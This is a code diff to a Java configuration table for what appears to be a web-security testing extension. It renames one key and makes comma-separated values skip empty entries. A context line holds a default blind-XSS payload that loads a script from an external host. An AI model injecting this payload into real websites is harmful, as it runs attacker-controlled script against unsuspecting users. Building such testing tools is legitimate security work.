@@ -26,7 +26,7 @@ public class ConfigTableModel extends AbstractTableModel{
 		configEntries.add(new ConfigEntry("browserPath", "C:\\Program Files\\Mozilla Firefox\\firefox.exe",ConfigEntry.Config_Basic_Variable,true,false));
 		configEntries.add(new ConfigEntry("tokenHeaders", "token,Authorization,Auth,jwt",ConfigEntry.Config_Basic_Variable,true,false));
 		configEntries.add(new ConfigEntry("DismissedHost", "*.firefox.com,*.mozilla.com",ConfigEntry.Config_Basic_Variable,true,false));
-		configEntries.add(new ConfigEntry("DismissedUrl", "",ConfigEntry.Config_Basic_Variable,true,false));
+		configEntries.add(new ConfigEntry("DismissedURL", "",ConfigEntry.Config_Basic_Variable,true,false));
 		configEntries.add(new ConfigEntry("DismissAction", "enable = ACTION_DROP; disable = ACTION_DONT_INTERCEPT",ConfigEntry.Config_Basic_Variable,true,false,"enable this config to use ACTION_DROP,disable to use ACTION_DONT_INTERCEPT"));
 		configEntries.add(new ConfigEntry("XSS-Payload", "'\\\"><sCRiPt/src=//bmw.xss.ht>",ConfigEntry.Config_Basic_Variable,true,false));
 		
@@ -101,12 +101,16 @@ public class ConfigTableModel extends AbstractTableModel{
 	}
 
 	public Set<String> getConfigValueSetByKey(String key) {
-		Set<String> result = new HashSet<String>();
+		Set<String> result = new HashSet<>();
 		for (ConfigEntry entry:configEntries) {
 			if (entry.getKey().equals(key) && entry.isEnable()) {
-				String tmp = entry.getValue();
-				String[] tmpArray = tmp.split(",");
-				result.addAll(Arrays.asList(tmpArray));
+				String tmp = entry.getValue().trim();
+				if (tmp.equals("")){
+
+				}else {
+					String[] tmpArray = tmp.split(",");
+					result.addAll(Arrays.asList(tmpArray));
+				}
 			}
 		}
 		return result;
